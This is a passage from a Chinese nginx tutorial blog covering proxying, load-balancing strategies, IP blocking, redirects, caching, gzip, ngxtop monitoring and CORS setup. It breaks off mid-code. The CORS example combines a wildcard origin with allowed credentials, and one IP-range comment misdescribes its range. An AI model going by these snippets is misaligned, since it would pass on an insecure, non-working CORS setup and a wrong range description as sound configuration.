class="comment">#缓冲区代理缓冲用户端请求的最大字节数</span></span><br><span class="line">        <span class="attribute">proxy_connect_timeout</span>      <span class="number">300</span>;  <span class="comment">#nginx跟后端服务器连接超时时间(代理连接超时)</span></span><br><span class="line">        <span class="attribute">proxy_send_timeout</span>         <span class="number">300</span>;  <span class="comment">#后端服务器数据回传时间(代理发送超时)</span></span><br><span class="line">        <span class="attribute">proxy_read_timeout</span>         <span class="number">300</span>;  <span class="comment">#连接成功后，后端服务器响应时间(代理接收超时)</span></span><br><span class="line">        <span class="attribute">proxy_buffer_size</span>          <span class="number">4k</span>; <span class="comment">#设置代理服务器（nginx）保存用户头信息的缓冲区大小</span></span><br><span class="line">        <span class="attribute">proxy_buffers</span>              <span class="number">4</span> <span class="number">32k</span>;<span class="comment"># 缓冲区，网页平均在32k以下的话，这样设置</span></span><br><span class="line">        <span class="attribute">proxy_busy_buffers_size</span>    <span class="number">64k</span>; <span class="comment">#高负荷下缓冲大小（proxy_buffers*2）</span></span><br><span class="line">        <span class="attribute">proxy_temp_file_write_size</span> <span class="number">64k</span>; <span class="comment">#设定缓存文件夹大小，大于这个值，将从upstream服务器传</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器<code>down</code>掉，能自动剔除。</li></ul><p><strong>负载均衡：</strong></p><ul><li><code>upstream</code>模块能够使用3种负载均衡算法：轮询、IP哈希、最少连接数。</li></ul><p><strong>轮询：</strong> </p><ul><li>默认情况下使用轮询算法，不需要配置指令来激活它，它是基于在队列中谁是下一个的原理确保访问均匀地分布到每个上游服务器；  </li></ul><p><strong>IP哈希：</strong> </p><ul><li>通过<code>ip_hash</code>指令来激活，Nginx通过IPv4地址的前3个字节或者整个IPv6地址作为哈希键来实现，同一个IP地址总是能被映射到同一个上游服务器；  </li></ul><p><strong>最少连接数：</strong> </p><ul><li>通过<code>least_conn</code>指令来激活，该算法通过选择一个活跃数最少的上游服务器进行连接。如果上游服务器处理能力不同，可以通过给<code>server</code>配置<code>weight</code>权重来说明，该算法将考虑到不同服务器的加权最少连接数。</li></ul><h4 id="6-7-1-RR"><a href="#6-7-1-RR" class="headerlink" title="6.7.1 RR"></a>6.7.1 RR</h4><p><strong>简单配置</strong> </p><blockquote><p>这里我配置了2台服务器，当然实际上是一台，只是端口不一样而已，而8081的服务器是不存在的，也就是说访问不到，但是我们访问 <code>http://localhost</code> 的时候，也不会有问题，会默认跳转到<code>http://localhost:8080</code>具体是因为Nginx会自动判断服务器的状态，如果服务器处于不能访问（服务器挂了），就不会跳转到这台服务器，所以也避免了一台服务器挂了影响使用的情况，由于Nginx默认是RR策略，所以我们不需要其他更多的设置</p></blockquote><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">upstream</span> test &#123;</span><br><span class="line">    <span class="attribute">server</span> localhost:<span class="number">8080</span>;</span><br><span class="line">    <span class="attribute">server</span> localhost:<span class="number">8081</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">81</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  localhost;</span><br><span class="line">    <span class="attribute">client_max_body_size</span> <span class="number">1024M</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://test;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>:<span class="variable">$server_port</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>负载均衡的核心代码为</strong> </p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">upstream</span> test &#123;</span><br><span class="line">    <span class="attribute">server</span> localhost:<span class="number">8080</span>;</span><br><span class="line">    <span class="attribute">server</span> localhost:<span class="number">8081</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="6-7-2-权重"><a href="#6-7-2-权重" class="headerlink" title="6.7.2 权重"></a>6.7.2 权重</h4><ul><li>指定轮询几率，<code>weight</code>和访问比率成正比，用于后端服务器性能不均的情况。 例如</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">upstream</span> test &#123;</span><br><span class="line">    <span class="attribute">server</span> localhost:<span class="number">8080</span> weight=<span class="number">9</span>;</span><br><span class="line">    <span class="attribute">server</span> localhost:<span class="number">8081</span> weight=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>那么10次一般只会有<code>1</code>次会访问到<code>8081</code>，而有<code>9</code>次会访问到<code>8080</code></li></ul><h4 id="6-7-3-ip-hash"><a href="#6-7-3-ip-hash" class="headerlink" title="6.7.3 ip_hash"></a>6.7.3 ip_hash</h4><blockquote><p>上面的2种方式都有一个问题，那就是下一个请求来的时候请求可能分发到另外一个服务器，当我们的程序不是无状态的时候（采用了<code>session</code>保存数据），这时候就有一个很大的很问题了，比如把登录信息保存到了<code>session</code>中，那么跳转到另外一台服务器的时候就需要重新登录了，所以很多时候我们需要一个客户只访问一个服务器，那么就需要用<code>iphash</code>了，<code>iphash</code>的每个请求按访问<code>ip</code>的<code>hash</code>结果分配，这样每个访客固定访问一个后端服务器，可以解决<code>session</code>的问题。</p></blockquote><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">upstream</span> test &#123;</span><br><span class="line">    ip_hash;</span><br><span class="line">    <span class="attribute">server</span> localhost:<span class="number">8080</span>;</span><br><span class="line">    <span class="attribute">server</span> localhost:<span class="number">8081</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="6-7-4-fair"><a href="#6-7-4-fair" class="headerlink" title="6.7.4 fair"></a>6.7.4 fair</h4><ul><li>这是个第三方模块，按后端服务器的响应时间来分配请求，响应时间短的优先分配。</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">upstream</span> backend &#123;</span><br><span class="line">    fair;</span><br><span class="line">    <span class="attribute">server</span> localhost:<span class="number">8080</span>;</span><br><span class="line">    <span class="attribute">server</span> localhost:<span class="number">8081</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="6-7-5-url-hash"><a href="#6-7-5-url-hash" class="headerlink" title="6.7.5 url_hash"></a>6.7.5 url_hash</h4><blockquote><p>这是个第三方模块，按访问<code>url</code>的<code>hash</code>结果来分配请求，使每个<code>url</code>定向到同一个后端服务器，后端服务器为缓存时比较有效。 在<code>upstream</code>中加入<code>hash</code>语句，<code>server</code>语句中不能写入<code>weight</code>等其他的参数，<code>hash_method</code>是使用的<code>hash</code>算法</p></blockquote><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">upstream</span> backend &#123;</span><br><span class="line">    <span class="attribute">hash</span> <span class="variable">$request_uri</span>;</span><br><span class="line">    <span class="attribute">hash_method</span> crc32;</span><br><span class="line">    <span class="attribute">server</span> localhost:<span class="number">8080</span>;</span><br><span class="line">    <span class="attribute">server</span> localhost:<span class="number">8081</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>以上<code>5</code>种负载均衡各自适用不同情况下使用，所以可以根据实际情况选择使用哪种策略模式，不过<code>fair</code>和<code>url_hash</code>需要安装第三方模块才能使用</li></ul><p><strong>server指令可选参数：</strong></p><ul><li><code>weight</code>：设置一个服务器的访问权重，数值越高，收到的请求也越多；</li><li><code>fail_timeout</code>：在这个指定的时间内服务器必须提供响应，如果在这个时间内没有收到响应，那么服务器将会被标记为<code>down</code>状态；</li><li><code>max_fails</code>：设置在<code>fail_timeout</code>时间之内尝试对一个服务器连接的最大次数，如果超过这个次数，那么服务器将会被标记为<code>down</code>;</li><li><code>down</code>：标记一个服务器不再接受任何请求；</li><li><code>backup</code>：一旦其他服务器宕机，那么有该标记的机器将会接收请求。</li></ul><p><strong>keepalive指令：</strong></p><ul><li><code>Nginx</code>服务器将会为每一个<code>worker</code>进行保持同上游服务器的连接。</li></ul><h3 id="6-8-屏蔽ip"><a href="#6-8-屏蔽ip" class="headerlink" title="6.8 屏蔽ip"></a>6.8 屏蔽ip</h3><ul><li>在<code>nginx</code>的配置文件<code>nginx.conf</code>中加入如下配置，可以放到<code>http</code>, <code>server</code>, <code>location</code>, <code>limit_except</code>语句块，需要注意相对路径，本例当中<code>nginx.conf</code>，<code>blocksip.conf</code>在同一个目录中。</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">include</span> blockip.conf;</span><br></pre></td></tr></table></figure><ul><li>在<code>blockip.conf</code>里面输入内容，如：</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">deny</span> <span class="number">165.91.122.67</span>;</span><br><span class="line"></span><br><span class="line"><span class="attribute">deny</span> IP;   <span class="comment"># 屏蔽单个ip访问</span></span><br><span class="line"><span class="attribute">allow</span> IP;  <span class="comment"># 允许单个ip访问</span></span><br><span class="line"><span class="attribute">deny</span> all;  <span class="comment"># 屏蔽所有ip访问</span></span><br><span class="line"><span class="attribute">allow</span> all; <span class="comment"># 允许所有ip访问</span></span><br><span class="line"><span class="attribute">deny</span> <span class="number">123.0.0.0</span>/<span class="number">8</span>   <span class="comment"># 屏蔽整个段即从123.0.0.1到123.255.255.254访问的命令</span></span><br><span class="line">deny <span class="number">124.45.0.0</span>/<span class="number">16</span> <span class="comment"># 屏蔽IP段即从123.45.0.1到123.45.255.254访问的命令</span></span><br><span class="line">deny <span class="number">123.45.6.0</span>/<span class="number">24</span> <span class="comment"># 屏蔽IP段即从123.45.6.1到123.45.6.254访问的命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果你想实现这样的应用，除了几个IP外，其他全部拒绝</span></span><br><span class="line">allow <span class="number">1.1.1.1</span>; </span><br><span class="line"><span class="attribute">allow</span> <span class="number">1.1.1.2</span>;</span><br><span class="line"><span class="attribute">deny</span> all;</span><br></pre></td></tr></table></figure><h2 id="七、第三方模块安装方法"><a href="#七、第三方模块安装方法" class="headerlink" title="七、第三方模块安装方法"></a>七、第三方模块安装方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/你的安装目录  --add-module=/第三方模块目录</span><br></pre></td></tr></table></figure><h2 id="八、重定向"><a href="#八、重定向" class="headerlink" title="八、重定向"></a>八、重定向</h2><ul><li><code>permanent</code> 永久性重定向。请求日志中的状态码为301</li><li><code>redirect</code> 临时重定向。请求日志中的状态码为302</li></ul><h3 id="8-1-重定向整个网站"><a href="#8-1-重定向整个网站" class="headerlink" title="8.1 重定向整个网站"></a>8.1 重定向整个网站</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">server_name</span> old-site.com</span><br><span class="line">    return <span class="number">301</span> <span class="variable">$scheme</span>://new-site.com<span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-2-重定向单页"><a href="#8-2-重定向单页" class="headerlink" title="8.2 重定向单页"></a>8.2 重定向单页</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">location</span> = /oldpage.html &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">301</span> http://example.org/newpage.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-3-重定向整个子路径"><a href="#8-3-重定向整个子路径" class="headerlink" title="8.3 重定向整个子路径"></a>8.3 重定向整个子路径</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /old-site &#123;</span><br><span class="line">    <span class="attribute">rewrite</span><span class="regexp"> ^/old-site/(.*)</span> http://example.org/new-site/<span class="variable">$1</span> <span class="literal">permanent</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="九、性能"><a href="#九、性能" class="headerlink" title="九、性能"></a>九、性能</h2><h3 id="9-1-内容缓存"><a href="#9-1-内容缓存" class="headerlink" title="9.1 内容缓存"></a>9.1 内容缓存</h3><ul><li>允许浏览器基本上永久地缓存静态内容。 <code>Nginx</code>将为您设置<code>Expires</code>和<code>Cache-Control</code>头信息。</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /static &#123;</span><br><span class="line">    <span class="attribute">root</span> /data;</span><br><span class="line">    <span class="attribute">expires</span> max;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果要求浏览器永远不会缓存响应（例如用于跟踪请求），请使用<code>-1</code>。</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> = /empty.gif &#123;</span><br><span class="line">    empty_gif;</span><br><span class="line">    <span class="attribute">expires</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-2-Gzip压缩"><a href="#9-2-Gzip压缩" class="headerlink" title="9.2 Gzip压缩"></a>9.2 Gzip压缩</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gzip</span>  <span class="literal">on</span>;</span><br><span class="line"><span class="attribute">gzip_buffers</span> <span class="number">16</span> <span class="number">8k</span>;</span><br><span class="line"><span class="attribute">gzip_comp_level</span> <span class="number">6</span>;</span><br><span class="line"><span class="attribute">gzip_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line"><span class="attribute">gzip_min_length</span> <span class="number">256</span>;</span><br><span class="line"><span class="attribute">gzip_proxied</span> any;</span><br><span class="line"><span class="attribute">gzip_vary</span> <span class="literal">on</span>;</span><br><span class="line">gzip_types</span><br><span class="line">    text/xml application/xml application/atom+xml application/rss+xml application/xhtml+xml image/svg+xml</span><br><span class="line">    text/javascript application/javascript application/x-javascript</span><br><span class="line">    text/x-json application/json application/x-web-app-manifest+json</span><br><span class="line">    text/css text/plain text/x-component</span><br><span class="line">    font/opentype application/x-font-ttf application/vnd.ms-fontobject</span><br><span class="line">    image/x-icon;</span><br><span class="line"><span class="attribute">gzip_disable</span>  <span class="string">"msie6"</span>;</span><br></pre></td></tr></table></figure><h3 id="9-3-打开文件缓存"><a href="#9-3-打开文件缓存" class="headerlink" title="9.3 打开文件缓存"></a>9.3 打开文件缓存</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">open_file_cache</span> max=<span class="number">1000</span> inactive=<span class="number">20s</span>;</span><br><span class="line"><span class="attribute">open_file_cache_valid</span> <span class="number">30s</span>;</span><br><span class="line"><span class="attribute">open_file_cache_min_uses</span> <span class="number">2</span>;</span><br><span class="line"><span class="attribute">open_file_cache_errors</span> <span class="literal">on</span>;</span><br></pre></td></tr></table></figure><h3 id="9-4-SSL缓存"><a href="#9-4-SSL缓存" class="headerlink" title="9.4 SSL缓存"></a>9.4 SSL缓存</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssl_session_cache</span> shared:SSL:<span class="number">10m</span>;</span><br><span class="line"><span class="attribute">ssl_session_timeout</span> <span class="number">10m</span>;</span><br></pre></td></tr></table></figure><h3 id="9-5-上游Keepalive"><a href="#9-5-上游Keepalive" class="headerlink" title="9.5 上游Keepalive"></a>9.5 上游Keepalive</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">upstream</span> backend &#123;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:8080</span>;</span><br><span class="line">    <span class="attribute">keepalive</span> <span class="number">32</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="attribute">location</span> /api/ &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://backend;</span><br><span class="line">        <span class="attribute">proxy_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line">        <span class="attribute">proxy_set_header</span> Connection <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-6-监控"><a href="#9-6-监控" class="headerlink" title="9.6 监控"></a>9.6 监控</h3><ul><li>使用<code>ngxtop</code>实时解析<code>nginx</code>访问日志，并且将处理结果输出到终端，功能类似于系统命令<code>top</code>。所有示例都读取<code>nginx</code>配置文件的访问日志位置和格式。如果要指定访问日志文件和/或日志格式，请使用-f和-a选项。</li><li>注意：在<code>nginx</code>配置中<code>/usr/local/nginx/conf/nginx.conf</code>日志文件必须是绝对路径。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 ngxtop</span></span><br><span class="line">pip install ngxtop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实时状态</span></span><br><span class="line">ngxtop</span><br><span class="line"><span class="comment"># 状态为404的前10个请求的路径：</span></span><br><span class="line">ngxtop top request_path --filter <span class="string">'status == 404'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送总字节数最多的前10个请求</span></span><br><span class="line">ngxtop --order-by <span class="string">'avg(bytes_sent) * count'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 排名前十位的IP，例如，谁攻击你最多</span></span><br><span class="line">ngxtop --group-by remote_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印具有4xx或5xx状态的请求，以及status和http referer</span></span><br><span class="line">ngxtop -i <span class="string">'status &gt;= 400'</span> <span class="built_in">print</span> request status http_referer</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由200个请求路径响应发送的平均正文字节以'foo'开始：</span></span><br><span class="line">ngxtop avg bytes_sent --filter <span class="string">'status == 200 and request_path.startswith("foo")'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用“common”日志格式从远程机器分析apache访问日志</span></span><br><span class="line">ssh remote tail -f /var/<span class="built_in">log</span>/apache2/access.log | ngxtop -f common</span><br></pre></td></tr></table></figure><h2 id="十、常见使用场景"><a href="#十、常见使用场景" class="headerlink" title="十、常见使用场景"></a>十、常见使用场景</h2><h3 id="10-1-跨域问题"><a href="#10-1-跨域问题" class="headerlink" title="10.1 跨域问题"></a>10.1 跨域问题</h3><ul><li>在工作中，有时候会遇到一些接口不支持跨域，这时候可以简单的添加<code>add_headers</code>来支持<code>cors</code>跨域。配置如下：</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">  <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">  <span class="attribute">server_name</span> api.xxx.com;</span><br><span class="line">    </span><br><span class="line">  <span class="attribute">add_header</span> <span class="string">'Access-Control-Allow-Origin'</span> <span class="string">'*'</span>;</span><br><span class="line">  <span class="attribute">add_header</span> <span class="string">'Access-Control-Allow-Credentials'</span> <span class="string">'true'</span>;</span><br><span class="line">  <span class="attribute">add_header</span> <span class="string">'Access-Control-Allow-Methods'</span> <span class="string">'GET,POST,HEAD'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="attribute">location</span> / &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1:3000;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host  <span class="variable">$http_host</span>;    </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>上面更改头信息，还有一种，使用 <a href="http://nginx.org/en/docs/http/ngx_http_rewrite_module.html" target="_blank" rel="noopener">rewrite</a> 指令重定向URI来解决跨域问题。</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">upstream</span> test &#123;</span><br><span class="line">  <span class="attribute">server</span> <span class="number">127.0.0.1:8080</span>;</span><br><span class="line">  <span class="attribute">server</span> localhost:<span class="number">8081</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">  <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">  <span class="attribute">server_name</span> api.xxx.com;</span><br><span class="line">  <span class="attribute">location</span> / &#123; </span><br><span class="line">    <span class="attribute">root</span>  html;                   <span class="comment">#去请求../html文件夹里的文件</span></span><br><span class="line">    <span class="attribute">index</span>  index.html index.htm;  <span class="comment">#首页响应地址</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment"># 用于拦截请求，匹配任何以 /api/开头的地址，</span></span><br><span class="line">  <span class="comment"># 匹配符合以后，停止往下搜索正则。</span></span><br><span class="line">  <span class="attribute">location</span><span class="regexp"> ^~/api/</span>&#123; </span><br><span class="line">    <span class="comment"># 代表重写拦截进来的请求，并且只能对域名后边的除去传递的参数外的字符串起作用，</span></span><br><span class="line">    <span class="comment"># 例如www.a.com/proxy/api/msg?meth=1&amp;par=2重写，只对/proxy/api/msg重写。</span></span><br><span class="line">    <span class="comment"># rewrite后面的参数是一个简单的正则 ^/api/(.*)$，</span></span><br><span class="line">    <span class="comment"># $1代表正则中的第一个()，$2代表第二个()的值，以此类推。</span></span><br><span class="line">    <span class="attribute">rewrite</span><span class="regexp"> ^/api/(.*)$</span> /<span class="variable">$1</span> <span class="literal">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 把请求代理到其他主机 </span></span><br><span class="line">    <span class="comment"># 其中 http://www.b.com/ 写法和 http://www.b.com写法的区别如下</span></span><br><span class="line">    <span class="comment"># 如果你的请求地址是他 http://server/html/test.jsp</span></span><br><span class="line">    <span class="comment"># 配置一： http://www.b.com/ 后面有“/” </span></span><br><span class="line">    <span class="comment">#         将反向代理成 http://www.b.com/html/test.jsp 访问</span></span><br><span class="line">    <span class="comment"># 配置一： http://www.b.com 后面没有有“/” </span></span><br><span class="line">    <span class="comment">#         将反向代理成 http://www.b.com/test.jsp 访问</span></span><br><span class="line">    <span class="attribute">proxy_pass</span> http://test;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果 proxy_pass  URL 是 http://a.xx.com/platform/ 这种情况</span></span><br><span class="line">    <span class="comment"># proxy_cookie_path应该设置成 /platform/ / (注意两个斜杠之间有空格)。</span></span><br><span class="line">    <span class="attribute">proxy_cookie_path</span> /platfrom/ /;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_pass_header</span></span><br><span class="line">    <span class="comment"># 设置 Cookie 头通过</span></span><br><span class="line">    <span class="attribute">proxy_pass_header</span> Set-Cookie;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-2-跳转到带www的域上面"><a href="#10-2-跳转到带www的域上面" class="headerlink" title="10.2 跳转到带www的域上面"></a>10.2 跳转到带www的域上面</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="comment"># 配置正常的带www的域名</span></span><br><span class="line">    <span class="attribute">server_name</span> www.wangchujiang.com;</span><br><span class="line">    <span class="attribute">root</span> /home/www/wabg/download;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.html =<span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="comment"># 这个要放到下面，</span></span><br><span class="line">    <span class="comment"># 将不带www的 wangchujiang.com 永久性重定向到  https://www.wangchujiang.com</span></span><br><span class="line">    <span class="attribute">server_name</span> wangchujiang.com;</span><br><span class="line">    <span class="attribute">rewrite</span><span class="regexp"> ^(.*)</span> https://www.wangchujiang.com<span class="variable">$1</span> <span class="literal">permanent</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-3-代理转发"><a href="#10-3-代理转发" class="headerlink" title="10.3 代理转发"></a>10.3 代理转发</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 